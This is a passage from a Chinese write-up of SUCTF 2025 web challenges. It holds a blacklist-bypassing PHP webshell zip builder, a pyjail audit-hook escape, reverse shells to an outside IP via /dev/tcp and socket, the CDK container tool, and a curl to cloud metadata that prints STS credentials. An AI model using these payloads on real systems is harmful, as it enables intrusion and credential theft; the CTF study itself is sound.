$file\n&quot;;</span><br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>                &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">move_file</span>(<span class="hljs-params"><span class="hljs-variable">$path</span>,<span class="hljs-variable">$basePath</span></span>)</span>&#123;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-variable">$path</span> . DIRECTORY_SEPARATOR . <span class="hljs-string">&#x27;*&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>        <span class="hljs-variable">$destination</span> = <span class="hljs-variable">$basePath</span> . DIRECTORY_SEPARATOR . <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$file</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$destination</span>))&#123;<br>            <span class="hljs-comment">// echo &quot;Fail to rename file: $file\n&quot;;</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>      <br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_base</span>(<span class="hljs-params"><span class="hljs-variable">$fileContent</span></span>)</span>&#123;<br>    <span class="hljs-variable">$keywords</span> = [<span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;base64&#x27;</span>, <span class="hljs-string">&#x27;shell_exec&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;passthru&#x27;</span>, <span class="hljs-string">&#x27;assert&#x27;</span>, <span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;phar&#x27;</span>, <span class="hljs-string">&#x27;xml&#x27;</span>, <span class="hljs-string">&#x27;DOCTYPE&#x27;</span>, <span class="hljs-string">&#x27;iconv&#x27;</span>, <span class="hljs-string">&#x27;zip&#x27;</span>, <span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-string">&#x27;chr&#x27;</span>, <span class="hljs-string">&#x27;hex2bin&#x27;</span>, <span class="hljs-string">&#x27;dir&#x27;</span>, <span class="hljs-string">&#x27;function&#x27;</span>, <span class="hljs-string">&#x27;pcntl_exec&#x27;</span>, <span class="hljs-string">&#x27;array&#x27;</span>, <span class="hljs-string">&#x27;include&#x27;</span>, <span class="hljs-string">&#x27;require&#x27;</span>, <span class="hljs-string">&#x27;call_user_func&#x27;</span>, <span class="hljs-string">&#x27;getallheaders&#x27;</span>, <span class="hljs-string">&#x27;get_defined_vars&#x27;</span>,<span class="hljs-string">&#x27;info&#x27;</span>];<br>    <span class="hljs-variable">$base64_keywords</span> = [];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$keywords</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$keyword</span>) &#123;<br>        <span class="hljs-variable">$base64_keywords</span>[] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$keyword</span>);<br>    &#125;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$base64_keywords</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$base64_keyword</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$fileContent</span>, <span class="hljs-variable">$base64_keyword</span>)!== <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_content</span>(<span class="hljs-params"><span class="hljs-variable">$zip</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$zip</span>-&gt;numFiles; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$fileInfo</span> = <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">statIndex</span>(<span class="hljs-variable">$i</span>);<br>        <span class="hljs-variable">$fileName</span> = <span class="hljs-variable">$fileInfo</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-comment">//        if (preg_match(&#x27;/\.\.(\/|\.|%2e%2e%2f)/i&#x27;, $fileName)) &#123;</span><br><span class="hljs-comment">//            return false;</span><br><span class="hljs-comment">//        &#125;</span><br>             <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Checking file: <span class="hljs-subst">$fileName</span>\n&quot;</span>;<br>            <span class="hljs-variable">$fileContent</span> = <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">getFromName</span>(<span class="hljs-variable">$fileName</span>);<br>            <br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(eval|base64|shell_exec|system|passthru|assert|flag|exec|phar|xml|DOCTYPE|iconv|zip|file|chr|hex2bin|dir|function|pcntl_exec|array|include|require|call_user_func|getallheaders|get_defined_vars|info)/i&#x27;</span>, <span class="hljs-variable">$fileContent</span>) || <span class="hljs-title function_ invoke__">check_base</span>(<span class="hljs-variable">$fileContent</span>)) &#123;<br>                <span class="hljs-comment">// echo &quot;Don&#x27;t hack me!\n&quot;;    </span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>        &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unzip</span>(<span class="hljs-params"><span class="hljs-variable">$zipname</span>, <span class="hljs-variable">$basePath</span></span>) </span>&#123;<br>    <span class="hljs-variable">$zip</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$zipname</span>)) &#123;<br>        <span class="hljs-comment">// echo &quot;Zip file does not exist&quot;;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;zip_not_found&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$zipname</span>)) &#123;<br>        <span class="hljs-comment">// echo &quot;Fail to open zip file&quot;;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;zip_open_failed&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">check_content</span>(<span class="hljs-variable">$zip</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;malicious_content_detected&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$randomDir</span> = <span class="hljs-string">&#x27;tmp_&#x27;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">0</span>, <span class="hljs-number">99999</span>));<br>    <span class="hljs-variable">$path</span> = <span class="hljs-variable">$basePath</span> . DIRECTORY_SEPARATOR . <span class="hljs-variable">$randomDir</span>;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$path</span>, <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>)) &#123;<br>        <span class="hljs-comment">// echo &quot;Fail to create directory&quot;;</span><br>        <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;mkdir_failed&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">extractTo</span>(<span class="hljs-variable">$path</span>)) &#123;<br>        <span class="hljs-comment">// echo &quot;Fail to extract zip file&quot;;</span><br>        <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$zip</span>-&gt;numFiles; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$fileInfo</span> = <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">statIndex</span>(<span class="hljs-variable">$i</span>);<br>        <span class="hljs-variable">$fileName</span> = <span class="hljs-variable">$fileInfo</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">check_extension</span>(<span class="hljs-variable">$fileName</span>, <span class="hljs-variable">$path</span>)) &#123;<br>            <span class="hljs-comment">// echo &quot;Unsupported file extension&quot;;</span><br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_rename</span>(<span class="hljs-variable">$path</span>, <span class="hljs-variable">$fileName</span>)) &#123;<br>            <span class="hljs-comment">// echo &quot;File rename failed&quot;;</span><br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">move_file</span>(<span class="hljs-variable">$path</span>, <span class="hljs-variable">$basePath</span>)) &#123;<br>        <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>        <span class="hljs-comment">// echo &quot;Fail to move file&quot;;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;move_failed&quot;</span>;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">rmdir</span>(<span class="hljs-variable">$path</span>);<br>    <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><br><span class="hljs-variable">$uploadDir</span> = <span class="hljs-keyword">__DIR__</span> . DIRECTORY_SEPARATOR . <span class="hljs-string">&#x27;upload/suimages/&#x27;</span>;<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$uploadDir</span>)) &#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$uploadDir</span>, <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>] === UPLOAD_ERR_OK) &#123;<br>    <span class="hljs-variable">$uploadedFile</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$zipname</span> = <span class="hljs-variable">$uploadedFile</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$path</span> = <span class="hljs-variable">$uploadDir</span>;<br><br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">unzip</span>(<span class="hljs-variable">$zipname</span>, <span class="hljs-variable">$path</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span> === <span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: index.php?status=success&quot;</span>);<br>        <span class="hljs-keyword">exit</span>();<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: index.php?status=<span class="hljs-subst">$result</span>&quot;</span>);<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: index.php?status=file_error&quot;</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>这里可以得到文件上传的路径是：<code>upload/suimages/</code></p><p>这里的非预期就是你访问可以找到其他人写的马，然后用开头那个一样的方法就可以访问🐎的参数是啥，蹭车就完事了。。。</p><p>真正绕这个blacklist的手段，后续队里也有人做出来了，但是蹭车提前交了就交了吧hh</p><p>官方给的wp说是在上传的时候就解压压缩包了,可以直接利用解压报错：</p><p><a href="https://www.leavesongs.com/PENETRATION/after-phpcms-upload-vul.html">回忆phpcms头像上传漏洞以及后续影响 | 离别歌</a></p><p><img src="/2025/01/15/SUCTF2025-WEB-Learning/image-20250115201621408.png" alt="image-20250115201621408"></p><p><img src="/2025/01/15/SUCTF2025-WEB-Learning/image-20250115201629300.png" alt="image-20250115201629300"></p><p>以及：<a href="https://twe1v3.top/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/#%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BFonezip%E6%8A%A5%E9%94%99%E8%A7%A3%E5%8E%8B">twe1v3.top&#x2F;2022&#x2F;10&#x2F;CTF中zip文件的使用&#x2F;#利用姿势onezip报错解压</a></p><p>那么可以通过拼接绕过黑名单：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">import</span> io<br><br>mf = io.BytesIO()<br><span class="hljs-keyword">with</span> zipfile.ZipFile(mf, mode=<span class="hljs-string">&quot;w&quot;</span>, compression=zipfile.ZIP_STORED) <span class="hljs-keyword">as</span> zf:<br>    zf.writestr(<span class="hljs-string">&#x27;fff.php&#x27;</span>, <span class="hljs-string">b&#x27;&#x27;&#x27;@&lt;?php $a = &quot;sy&quot;.&quot;s&quot;.&quot;tem&quot;; $a(&quot;ls / &quot;);?&gt;&#x27;&#x27;&#x27;</span>)<br>    zf.writestr(<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">5000</span>, <span class="hljs-string">b&#x27;AAAAA&#x27;</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;shell.zip&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(mf.getvalue())<br></code></pre></td></tr></table></figure><img src="/2025/01/15/SUCTF2025-WEB-Learning/image-20250115201840200.png" class="" title="image-20250115201840200"><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">SUCTF&#123;sti1l_w0t3r_Run_d@@p!!!&#125;<br></code></pre></td></tr></table></figure><h2 id="SU-easyk8s-on-aliyun"><a href="#SU-easyk8s-on-aliyun" class="headerlink" title="SU_easyk8s_on_aliyun"></a>SU_easyk8s_on_aliyun</h2><p>开局一个pyjail，RCE很简单。当时我给R了入口机有事就先润了。。。</p><p>网上一搜就能搜到能用的，直接绕audit hook：</p><p><a href="https://xz.aliyun.com/t/12647?time__1311=GqGxuDRiYiwxlrzG7Dy7D9DRh2YeNK=3x#toc-34">CTF Pyjail 沙箱逃逸绕过合集 - 先知社区</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> _posixsubprocess<br><br>_posixsubprocess.fork_exec([<span class="hljs-string">b&quot;/bin/ls&quot;</span>,<span class="hljs-string">&quot;/&quot;</span>], [<span class="hljs-string">b&quot;/bin/ls&quot;</span>], <span class="hljs-literal">True</span>, (), <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, *(os.pipe()), <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>,<span class="hljs-literal">False</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, -<span class="hljs-number">1</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><p>可以直接读文件了：</p><p><code>audit.py</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br>DEBUG = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">audit_hook</span>(<span class="hljs-params">event, args</span>):<br>    audit_functions = &#123;<br>        <span class="hljs-string">&quot;os.system&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;subprocess.Popen&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;subprocess.run&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;subprocess.call&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;subprocess.check_call&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;subprocess.check_output&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;_posixsubprocess.fork_exec&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;os.spawn&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;os.spawnlp&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;os.spawnv&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;os.spawnve&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;os.exec&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;os.execve&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;os.execvp&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;os.execvpe&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;os.fork&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;shutil.run&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;ctypes.dlsym&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;ctypes.dlopen&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> event <span class="hljs-keyword">in</span> audit_functions:<br>        <span class="hljs-keyword">if</span> DEBUG:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[DEBUG] found event <span class="hljs-subst">&#123;event&#125;</span>&quot;</span>)<br>        policy = audit_functions[event]<br>        <span class="hljs-keyword">if</span> policy[<span class="hljs-string">&quot;ban&quot;</span>]:<br>            strr = <span class="hljs-string">f&quot;AUDIT BAN : Banning FUNC:[<span class="hljs-subst">&#123;event&#125;</span>] with ARGS: <span class="hljs-subst">&#123;args&#125;</span>&quot;</span><br>            <span class="hljs-built_in">print</span>(strr)<br>            <span class="hljs-keyword">raise</span> PermissionError(<span class="hljs-string">f&quot;[AUDIT BANNED]<span class="hljs-subst">&#123;event&#125;</span> is not allowed.&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            strr = <span class="hljs-string">f&quot;[DEBUG] AUDIT ALLOW : Allowing FUNC:[<span class="hljs-subst">&#123;event&#125;</span>] with ARGS: <span class="hljs-subst">&#123;args&#125;</span>&quot;</span><br>            <span class="hljs-built_in">print</span>(strr)<br>            <span class="hljs-keyword">return</span><br><br>sys.addaudithook(audit_hook)<br></code></pre></td></tr></table></figure><p>这里可以用wget下载bash文件然后弹shell。</p><p>也可以直接弹，但是要用base64不然弹不了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket, os, _posixsubprocess; <br><br>s = socket.socket(); <br>s.connect((<span class="hljs-string">&quot;xxxx&quot;</span>,<span class="hljs-number">9999</span>)); <br>[os.dup2(s.fileno(),fd) <span class="hljs-keyword">for</span> fd <span class="hljs-keyword">in</span> (<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)];<br><br>_posixsubprocess.fork_exec([<span class="hljs-string">b&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">b&quot;echo b64-payload | base64 -d | bash -i&quot;</span>], [<span class="hljs-string">b&quot;/bin/bash&quot;</span>], <span class="hljs-literal">True</span>, (), <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, *(os.pipe()), <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, -<span class="hljs-number">1</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><p>或者：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;_posixsubprocess&#x27;</span>).fork_exec(<br>    [<span class="hljs-string">b&quot;/bin/bash&quot;</span>, <span class="hljs-string">b&quot;-c&quot;</span>, <span class="hljs-string">b&quot;bash -i &gt;&amp; /dev/tcp/43.156.25.198/1232 0&gt;&amp;1&quot;</span>],<br>    [<span class="hljs-string">b&quot;/bin/bash&quot;</span>],<br>    <span class="hljs-literal">True</span>, (), <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>,<br>    -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>,<br>    *(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).pipe()),<br>    <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>,<br>    <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>,<br>    -<span class="hljs-number">1</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">False</span><br>)<br></code></pre></td></tr></table></figure><p>题目名提示了也在<code>aliyun</code>上，可以去找<code>aliyun</code>的元数据在哪里。</p><p>接下来是云安全的内容了。</p><p><a href="https://developer.aliyun.com/article/1626332#:~:text=%E5%90%84%E5%A4%A7%E4%BA%91%E5%85%83%E6%95%B0%E6%8D%AE,%EF%BC%9Ahttp://169.254.169.254/">云上攻防：实例元数据、控制台接管-阿里云开发者社区</a></p><p><a href="https://blog.csdn.net/qq_53577336/article/details/134143524">云安全-云原生基于容器漏洞的逃逸自动化手法（CDK check）_cve-2020-27151-CSDN博客</a></p><p>下载<code>cdk_linux_amd64</code>后进行信息检索</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget &lt;https://github.com/cdk-team/CDK/releases/download/v1.5.4/cdk_linux_amd64&gt;<br>./cdk_linux_amd64 evaluate<br></code></pre></td></tr></table></figure><p>可以从得到的信息里面看见</p><p><img src="/2025/01/15/SUCTF2025-WEB-Learning/image-20250115203407193.png" alt="image-20250115203407193"></p><p>接下来需要获取类似下面的信息：</p><p><a href="https://help.aliyun.com/zh/ecs/user-guide/view-instance-metadata?spm=a2c6h.12873639.article-detail.4.411f3ff64G0pqs">通过元数据服务从ECS实例内部获取实例属性等信息_云服务器 ECS(ECS)-阿里云帮助中心</a></p><p><img src="/2025/01/15/SUCTF2025-WEB-Learning/image-20250115203432279.png" alt="image-20250115203432279"></p><p>直接在这个机器上获取<code>sts</code>，即AK&#x2F;SK相关信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -H <span class="hljs-string">&quot;X-aliyun-ecs-metadata-token: <span class="hljs-variable">$TOKEN</span>&quot;</span> http://100.100.100.200/latest/meta-data/ram/security-credentials/oss-root                                                                                    <br>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                                                                                                            <br>                                 Dload  Upload   Total   Spent    Left  Speed                                                                                                                              <br>100   893  100   893    0     0  28858      0 --:--:-- --:--:-- --:--:-- 29766                                                                                  <br>&#123;   <br>  <span class="hljs-string">&quot;AccessKeyId&quot;</span> : <span class="hljs-string">&quot;STS.NSy4dsFrQgg9T1Sn86HEpSfGm&quot;</span>,                                                                                                                     <br>  <span class="hljs-string">&quot;AccessKeySecret&quot;</span> : <span class="hljs-string">&quot;9ogWdxi5Qff2Fna38xknBakmgdjQfdo5JgNWuSTMQKUt&quot;</span>,                                                                                                   <br>  <span class="hljs-string">&quot;Expiration&quot;</span> : <span class="hljs-string">&quot;2025-01-13T15:30:13Z&quot;</span>,                                                                                                                               <br>  <span class="hljs-string">&quot;SecurityToken&quot;</span> : <span 